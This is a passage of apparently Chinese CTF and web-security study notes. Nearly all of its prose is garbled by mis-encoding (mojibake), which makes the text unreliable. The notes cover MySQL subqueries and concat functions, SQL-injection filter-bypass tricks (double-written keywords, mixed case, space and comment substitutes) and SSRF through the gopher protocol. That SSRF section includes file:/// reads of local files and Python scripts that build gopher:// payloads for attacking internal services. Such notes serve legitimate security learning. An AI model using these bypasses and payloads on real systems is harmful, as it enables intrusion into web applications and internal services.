<p>4ï¼‰è·å–æŸåˆ—çš„å†…å®¹ ã€ä»¥ä¸‹è¯­å¥åŠŸèƒ½ï¼Œæ˜¾ç¤ºè¯¥åˆ—ã€‘</p>
<p><code>Select è¯¥åˆ—çš„ç›®æ ‡æ•°æ®åˆ†ç±»çš„åç§°  from   åˆ—å</code></p>
<h5 id="2-æ³¨å…¥æµç¨‹å›¾"><a href="#2-æ³¨å…¥æµç¨‹å›¾" class="headerlink" title="[2] æ³¨å…¥æµç¨‹å›¾"></a>[2] æ³¨å…¥æµç¨‹å›¾</h5><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1656476375&t=82f2380c052f036e8454035070bc6a42" alt="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&amp;refer=http%3A%2F%2Fimg-blog.csdnimg.cn&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1656476375&amp;t=82f2380c052f036e8454035070bc6a42"></p>
<h4 id="5-mysqlé”™è¯¯åˆ†æè§£å†³"><a href="#5-mysqlé”™è¯¯åˆ†æè§£å†³" class="headerlink" title="5.mysqlé”™è¯¯åˆ†æè§£å†³"></a>5.mysqlé”™è¯¯åˆ†æè§£å†³</h4><h5 id="1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ"><a href="#1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ" class="headerlink" title="1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ"></a>1ï¼‰å­æŸ¥è¯¢ç»“æœå¤šäºä¸€è¡Œ</h5><p><code>Subquery returns more than 1 row</code></p>
<p>ä»¥<code>select * from table1 where table1.colums=(select columns from table2)</code>è¿™ä¸ªsqlè¯­å¥ä¸ºä¾‹</p>
<p>1.å¦‚æœæ˜¯å†™å…¥é‡å¤ï¼Œå»æ‰é‡å¤æ•°æ®ã€‚ç„¶åå†™å…¥çš„æ—¶å€™ï¼Œå¯ä»¥åŠ é€»è¾‘åˆ¤æ–­(php)æˆ–è€…å¤–é”®(mysql)ï¼Œé˜²æ­¢æ•°æ®é‡å¤å†™å…¥ã€‚ï¼ˆä½†åœ¨å®é™…å¼€å‘ä¸­å¯èƒ½éœ€è¦é‡å¤å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦æ…é‡è€ƒè™‘ï¼‰</p>
<p>2.åœ¨å­æŸ¥è¯¢æ¡ä»¶è¯­å¥åŠ <code>limit 1</code>,æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„å°±å¯ä»¥äº†<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p>
<p>å¦‚æœéœ€è¦ç»§ç»­å‘åæŸ¥è¯¢ï¼Œå¯ä»¥ç”¨<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   â€¦..  <code>limit n,1</code></p>
<p>3.åœ¨å­æŸ¥è¯¢å‰åŠ anyå…³é”®å­—<br><code>select * from table1 where table1.colums=any(select columns from table2)</code></p>
<h5 id="ps-å­æŸ¥è¯¢è¯­å¥"><a href="#ps-å­æŸ¥è¯¢è¯­å¥" class="headerlink" title="ps. å­æŸ¥è¯¢è¯­å¥"></a>ps. å­æŸ¥è¯¢è¯­å¥</h5><p><strong>å­æŸ¥è¯¢</strong>æ˜¯æŒ‡åœ¨<strong>ä¸€ä¸ªselectè¯­å¥ä¸­åµŒå¥—å¦ä¸€ä¸ªslecetè¯­å¥</strong>ã€‚</p>
<p><strong>anyã€inã€someã€all</strong>åˆ†åˆ«æ˜¯å­æŸ¥è¯¢å…³é”®è¯ä¹‹ä¸€ã€‚</p>
<p><strong>any</strong>å¯ä»¥ä¸=ã€&gt;ã€&gt;=ã€&lt;ã€&lt;=ã€&lt;&gt;ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œåˆ†åˆ«è¡¨ç¤ºç­‰äºã€å¤§äºã€å¤§äºç­‰äºã€å°äºã€å°äºç­‰äºã€ä¸ç­‰äºå…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªæ•°æ®ã€‚</p>
<p>allå¯ä»¥ä¸=ã€&gt;ã€&gt;=ã€&lt;ã€&lt;=ã€&lt;&gt;ç»“åˆæ˜¯æ¥ä½¿ç”¨ï¼Œåˆ†åˆ«è¡¨ç¤ºç­‰äºã€å¤§äºã€å¤§äºç­‰äºã€å°äºã€å°äºç­‰äºã€ä¸ç­‰äºå…¶ä¸­çš„å…¶ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚</p>
<p>ä»–ä»¬è¿›è¡Œå­æŸ¥è¯¢çš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p>
<p><strong>any,allå…³é”®è¯å¿…é¡»ä¸ä¸€ä¸ªæ¯”è¾ƒæ“ä½œç¬¦ä¸€èµ·ä½¿ç”¨</strong></p>
<p>anyå…³é”®è¯å¯ä»¥ç†è§£ä¸º<strong>å¯¹äºå­æŸ¥è¯¢è¿”å›çš„åˆ—ä¸­çš„<u>ä»»æ„</u>æ•°å€¼ï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸ºtureï¼Œåˆ™è¿”å›true</strong><br>ä¾‹å¦‚ï¼š</p>
<p><code>select s1 from t1 where s1 &gt; any (select s1 from t2)</code></p>
<p>å‡è®¾è¡¨t1ä¸­æœ‰ä¸€è¡ŒåŒ…å«ï¼ˆ10ï¼‰ ï¼Œ t2åŒ…å«ï¼ˆ20,12,5ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºtrueï¼›å¦‚æœt2åŒ…å«ï¼ˆ20,10ï¼‰ï¼Œæˆ–è€…è¡¨t2ä½ç©ºè¡¨ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºfalseã€‚å¦‚æœt2åŒ…å«ï¼ˆnullï¼Œnullï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºunkonwnã€‚</p>
<p>allå…³é”®è¯<strong>å¯¹äºå­æŸ¥è¯¢è¿”å›çš„åˆ—ä¸­çš„<u>æ‰€æœ‰å€¼</u>ï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸ºtrueï¼Œåˆ™è¿”å›true</strong><br>ä¾‹å¦‚ï¼š</p>
<p><code>select s1 from t1 where s1&gt; all (select s1 from s2)</code></p>
<p>å‡è®¾è¡¨t1ä¸­æœ‰ä¸€è¡ŒåŒ…å«ï¼ˆ10ï¼‰ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ-5,0ï¼Œ+5ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºtrueï¼Œå› ä¸º10æ¯”t2ä¸­çš„æŸ¥å‡ºçš„æ‰€æœ‰ä¸‰ä¸ªå€¼å¤§ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ12,6ï¼Œnullï¼Œ-100ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºfalseï¼Œå› ä¸ºt2ä¸­æœ‰ä¸€ä¸ªå€¼12å¤§äº10ã€‚å¦‚æœè¡¨t2åŒ…å«ï¼ˆ0ï¼Œnullï¼Œ1ï¼‰ï¼Œåˆ™è¡¨è¾¾å¼ä¸ºunknownã€‚å¦‚æœt2ä¸ºç©ºè¡¨ï¼Œåˆ™ç»“æœä¸ºtrueã€‚</p>
<p>not in æ˜¯ â€œ&lt;&gt;allâ€çš„åˆ«åï¼Œç”¨æ³•ç›¸åŒã€‚<br>è¯­å¥in ä¸â€œ=anyâ€æ˜¯ç›¸åŒçš„ã€‚<br>ä¾‹å¦‚ï¼š</p>
<p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p>
<p>è¯­å¥someæ˜¯anyçš„åˆ«åï¼Œç”¨æ³•ç›¸åŒã€‚<br>ä¾‹å¦‚ï¼š</p>
<p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p>
<h4 id="6-mysql-è¿æ¥å‡½æ•°ï¼Œ-åˆ†ç»„è¿æ¥å‡½æ•°"><a href="#6-mysql-è¿æ¥å‡½æ•°ï¼Œ-åˆ†ç»„è¿æ¥å‡½æ•°" class="headerlink" title="6.mysql è¿æ¥å‡½æ•°ï¼Œ åˆ†ç»„è¿æ¥å‡½æ•°"></a>6.mysql è¿æ¥å‡½æ•°ï¼Œ åˆ†ç»„è¿æ¥å‡½æ•°</h4><h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,â€¦)</p>
<p>è‹¥æœ‰ä¸€ä¸ªå‚æ•°ä¸ºNULLï¼Œè¿”å›NULL</p>
<h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(â€˜é—´éš”ç¬¦å·â€™,str1,str2,â€¦)</p>
<p><strong>é—´éš”ç¬¦å·å¯ä»¥æ˜¯ç©ºæ ¼ï¼Œä¸èƒ½ä¸å†™ï¼Œå¦åˆ™è¿”å›ä¸ºç©º</strong></p>
<p> æ˜¾ç¤ºä¸º   <u>str1é—´éš”ç¬¦å·str2é—´éš”ç¬¦å·str3â€¦</u></p>
<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] å­—æ®µå [ order by æ’åºå­—æ®µ asc/desc ] [separator â€œåˆ†éš”ç¬¦â€])</p>
<p>å¤šè¡Œæ•°æ®åœ¨ä¸€è¡Œæ˜¾ç¤ºå‡½æ•°</p>
<p>æ ¹æ®group byæŒ‡å®šçš„åˆ—è¿›è¡Œæ’åºåˆ†ç»„ï¼Œå°†åŒä¸€ç»„æ˜¾ç¤ºå‡ºæ¥ï¼Œå¹¶ç”¨åˆ†éš”ç¬¦é—´éš”</p>
<h5 id="ps-ç»„åˆä½¿ç”¨"><a href="#ps-ç»„åˆä½¿ç”¨" class="headerlink" title="ps. ç»„åˆä½¿ç”¨"></a>ps. ç»„åˆä½¿ç”¨</h5><p>å¦‚æœæ˜¯å¤šå­—æ®µç»„åˆ æ˜¾ç¤ºåœ¨ä¸€è¡Œçš„egï¼š</p>
<p>group_concat(concat_ws(â€˜,â€™,concat(str1ï¼Œstr2) ) )ï¼›</p>
<p>ä¸€ä¸ªå­—æ®µçš„è¯egï¼š</p>
<p>group_concat(concat_ws(â€˜,â€™,str1ï¼Œstr2) )ï¼› </p>
<h4 id="7-è¿‡æ»¤æ›¿æ¢"><a href="#7-è¿‡æ»¤æ›¿æ¢" class="headerlink" title="*7.è¿‡æ»¤æ›¿æ¢"></a>*7.è¿‡æ»¤æ›¿æ¢</h4><h5 id="1ï¼‰åŒå†™ç»•è¿‡"><a href="#1ï¼‰åŒå†™ç»•è¿‡" class="headerlink" title="1ï¼‰åŒå†™ç»•è¿‡"></a>1ï¼‰åŒå†™ç»•è¿‡</h5><p>(ç”¨äºæŠŠé»‘åå•çš„å­—ç¬¦æ›¿æ¢æˆç©º)ï¼šse<u>select</u>lect,un<u>union</u>ionï¼Œoorrç­‰ç­‰ï¼ˆæ›¿æ¢ä¸ºç©ºåï¼Œå‰©ä½™è¯­å¥å°±æ˜¯æ ‡å‡†çš„sqlè¯­å¥ï¼Œä¸ä¼šå½±å“è¯­å¥çš„æ­£å¸¸æ‰§è¡Œï¼‰</p>
<p>ps.æ³¨æ„ï¼Œæœ‰çš„è¯­å¥å‘½ä»¤å¯èƒ½ä¼šå¸¦æœ‰é»‘åå•çš„å­—ç¬¦ï¼Œä¹Ÿéœ€è¦åŒå†™ï¼Œå¦‚<u>or</u>der,inf<u>or</u>mation.schema_schemataç­‰ï¼Œå½“ç½‘ç«™åœ¨æ£€æŸ¥æ—¶ï¼ŒåŒæ ·ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥éœ€è¦å†™æˆo<u>or</u>rder,info<u>or</u>rmation.schema_schemataç­‰ç­‰</p>
<h5 id="2ï¼‰å¤§å°å†™æ··åˆ"><a href="#2ï¼‰å¤§å°å†™æ··åˆ" class="headerlink" title="2ï¼‰å¤§å°å†™æ··åˆ"></a>2ï¼‰å¤§å°å†™æ··åˆ</h5><p>(ç”¨äºé»‘åå•ä¸­åªæœ‰å°å†™æˆ–å¤§å†™ï¼Œå¹¶æ²¡æœ‰å¯¹å¤§å°å†™è¿›è¡ŒåŒºåˆ†)</p>
<p>å¦‚sEleCt,unIoNç­‰ç­‰</p>
<h5 id="3ï¼‰æ›¿æ¢"><a href="#3ï¼‰æ›¿æ¢" class="headerlink" title="*3ï¼‰æ›¿æ¢"></a>*3ï¼‰æ›¿æ¢</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EXCEL"><figure class="iseeu highlight /excel"><table><tr><td class="code"><pre><span class="line">selectï¼š</span><br><span class="line"></span><br><span class="line">unionï¼š</span><br><span class="line"></span><br><span class="line">ç©ºæ ¼ï¼š%<span class="number">0</span>aï¼ˆåˆ†éš”ç¬¦ï¼‰ï¼Œ() ã€å¦‚select(table_name)from(xxx)ã€‘ï¼Œ&lt; &gt;ï¼Œ %<span class="number">20</span>(space), %<span class="number">09</span>(tab), $<span class="built_in">IFS</span>$<span class="number">9</span>ï¼ˆ$<span class="built_in">IFS</span>æ˜¯**Unix**ç³»ç»Ÿçš„ä¸€ä¸ªé¢„è®¾å˜é‡è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œ$<span class="number">9</span>åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼‰</span><br><span class="line"></span><br><span class="line">=ï¼šlike</span><br><span class="line"></span><br><span class="line"><span class="built_in">and</span>ï¼š&amp;&amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">or</span>ï¼š||</span><br></pre></td></tr></table></figure></div>



<h4 id="8-æ³¨é‡Šç¬¦"><a href="#8-æ³¨é‡Šç¬¦" class="headerlink" title="8. æ³¨é‡Šç¬¦"></a>8. æ³¨é‡Šç¬¦</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BRAINFUCK"><figure class="iseeu highlight /brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ã€</span> <span class="literal">--+</span><span class="comment">ã€</span> <span class="literal">--</span><span class="comment">%20ã€ %23</span></span><br></pre></td></tr></table></figure></div>



<hr>
<h3 id="äºŒã€xss"><a href="#äºŒã€xss" class="headerlink" title="äºŒã€xss"></a>äºŒã€xss</h3><hr>
<h3 id="ä¸‰ã€csrf"><a href="#ä¸‰ã€csrf" class="headerlink" title="ä¸‰ã€csrf"></a>ä¸‰ã€csrf</h3><hr>
<h3 id="å››ã€xxe"><a href="#å››ã€xxe" class="headerlink" title="å››ã€xxe"></a>å››ã€xxe</h3><hr>
<h3 id="äº”ã€ssrf"><a href="#äº”ã€ssrf" class="headerlink" title="äº”ã€ssrf"></a>äº”ã€ssrf</h3><h4 id="gopheråè®®æ€»ç»“"><a href="#gopheråè®®æ€»ç»“" class="headerlink" title="gopheråè®®æ€»ç»“"></a>gopheråè®®æ€»ç»“</h4><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667791">åŸæ–‡</a></p>
<p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">å¦ä¸€ç¯‡æ¨èçš„æ–‡ç« </a></p>
<p>gopheråè®®æ˜¯ä¸€ç§ä¿¡æ¯æŸ¥0æ‰¾ç³»ç»Ÿï¼Œä»–å°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œæ–¹ä¾¿ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ Redisã€Mysqlã€FastCGIã€Ftpç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ GETã€POST è¯·æ±‚ã€‚è¿™æ‹“å®½äº† SSRF çš„æ”»å‡»é¢</p>
<h5 id="1-åˆ©ç”¨ï¼š"><a href="#1-åˆ©ç”¨ï¼š" class="headerlink" title="1)åˆ©ç”¨ï¼š"></a>1)åˆ©ç”¨ï¼š</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line">æ”»å‡»å†…ç½‘çš„ Redisã€Mysqlã€FastCGIã€Ftpç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ <span class="meta">GET</span>ã€POST è¯·æ±‚</span><br></pre></td></tr></table></figure></div>



<p>gopheråè®®çš„æ ¼å¼ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IPæ•°æ®æµ  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span><span class="regexp">/_POST /</span>flag.php HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="regexp">/*æ³¨æ„_ç¬¦å·*/</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">æœ‰æ—¶å€™è¯»å–æ–‡ä»¶éœ€è¦ä»ç½‘ç«™æœ¬èº«çš„127.0.0.1å‘å‡ºè¯·æ±‚</span><br><span class="line"></span><br><span class="line"><span class="section">/*å¯ä»¥åˆ©ç”¨file://ä¼ªåè®®ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶*/</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line">æ¯”å¦‚</span><br><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></div>



<h5 id="2-GTEè¯·æ±‚"><a href="#2-GTEè¯·æ±‚" class="headerlink" title="2)GTEè¯·æ±‚"></a>2)GTEè¯·æ±‚</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">æ„é€ HTTPæ•°æ®åŒ…</span><br><span class="line"></span><br><span class="line">URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º<span class="meta">%</span><span class="number">0</span>d<span class="meta">%</span><span class="number">0</span>aï¼ŒHTTPåŒ…æœ€ååŠ <span class="meta">%</span><span class="number">0</span>d<span class="meta">%</span><span class="number">0</span>aä»£è¡¨æ¶ˆæ¯ç»“æŸ</span><br><span class="line"></span><br><span class="line">å‘é€gopheråè®®, åè®®åçš„IPä¸€å®šè¦æ¥ç«¯å£</span><br></pre></td></tr></table></figure></div>



<h5 id="3-POSTè¯·æ±‚"><a href="#3-POSTè¯·æ±‚" class="headerlink" title="3)POSTè¯·æ±‚"></a>3)POSTè¯·æ±‚</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">POSTä¸GETä¼ å‚çš„åŒºåˆ«ï¼šå®ƒæœ‰4ä¸ªå‚æ•°ä¸ºå¿…è¦å‚æ•°</span><br><span class="line"></span><br><span class="line">éœ€è¦ä¼ é€’</span><br><span class="line">Content-Type,</span><br><span class="line">Content-Length,</span><br><span class="line">host,</span><br><span class="line">postçš„å‚æ•°</span><br><span class="line"></span><br><span class="line"><span class="code">----</span></span><br><span class="line"><span class="code">æ¯”å¦‚ï¼š</span></span><br><span class="line"><span class="code">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="code">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="code">Content-Length: 36</span></span><br><span class="line"><span class="code">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">key=51457bb0a50c1eb2c92dcc3ec3c2cc13        //postå‚æ•°</span></span><br><span class="line"><span class="code">------</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**Hostã€Content-Typeå’ŒContent-Lengthè¯·æ±‚å¤´æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œä½†åœ¨ GETè¯·æ±‚ä¸­å¯ä»¥æ²¡æœ‰**</span></span><br><span class="line"><span class="strong">**åˆ‡è®°ï¼šContent-Length è¿™ä¸ªè¦å’Œåº•ä¸‹POSTå‚æ•°[æ¯”å¦‚ä¾‹å­ä¸­key=,4ä¸ª+51457bb0a50c1eb2c92dcc3ec3c2cc13,32ä¸ªï¼Œå…±è®¡36ä¸ª]é•¿åº¦ä¸€è‡´**</span></span><br></pre></td></tr></table></figure></div>



<p>pythonè„šæœ¬ç”Ÿæˆpayloadï¼ˆPOSTå’ŒGTEè¯·æ±‚éƒ½é€‚ç”¨ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#å¯¹payloadä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç </span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFLæ¼æ´</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># å¯¹æ–°å¢çš„éƒ¨åˆ†ç»§ç»­ç¼–ç </span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<h5 id="æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚"><a href="#æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚" class="headerlink" title="æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚"></a>æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚</h5><p>é¦–å…ˆæŠ“å–ä¸€ä¸ªæ­£å¸¸æäº¤æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œç„¶åä½¿ç”¨ä¸Šè¿°è„šæœ¬å°†å…¶è½¬æ¢ä¸ºgopheråè®®çš„æ ¼å¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">â€‹</span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">â€‹</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string">â€‹</span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string">â€‹</span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h5 id="gopheræ‰“FastCGI"><a href="#gopheræ‰“FastCGI" class="headerlink" title="gopheræ‰“FastCGI"></a>gopheræ‰“FastCGI</h5><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002">çœ‹æˆ‘è¿™ä¸€ç¯‡</a></p>
<h5 id="gopheræ‰“redis"><a href="#gopheræ‰“redis" class="headerlink" title="gopheræ‰“redis"></a>gopheræ‰“redis</h5><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">çœ‹æˆ‘è¿™ä¸€ç¯‡</a></p>
<h5 id="gopheræ‰“mysql"><a href="#gopheræ‰“mysql" class="headerlink" title="gopheræ‰“mysql"></a>gopheræ‰“mysql</h5><p>gopheræ‰“mysqlï¼Œå°±æ˜¯åˆ©ç”¨gopheråè®®ä¼ shellåˆ°mysqlä¸­ã€‚</p>
<p>é¦–å…ˆMysqlå­˜åœ¨ä¸‰ç§è¿æ¥æ–¹å¼</p>
<pre><code>Unixå¥—æ¥å­—ï¼›
å†…å­˜å…±äº«/å‘½åç®¡é“ï¼›
TCP/IPå¥—æ¥å­—ï¼›
</code></pre>
<p>MySQLå®¢æˆ·ç«¯è¿æ¥å¹¶ç™»å½•æœåŠ¡å™¨æ—¶å­˜åœ¨ä¸¤ç§æƒ…å†µï¼šéœ€è¦å¯†ç è®¤è¯ä»¥åŠæ— éœ€å¯†ç è®¤è¯ã€‚</p>
<pre><code>å½“éœ€è¦å¯†ç è®¤è¯æ—¶ä½¿ç”¨æŒ‘æˆ˜åº”ç­”æ¨¡å¼ï¼ŒæœåŠ¡å™¨å…ˆå‘é€saltç„¶åå®¢æˆ·ç«¯ä½¿ç”¨saltåŠ å¯†å¯†ç ç„¶åéªŒè¯
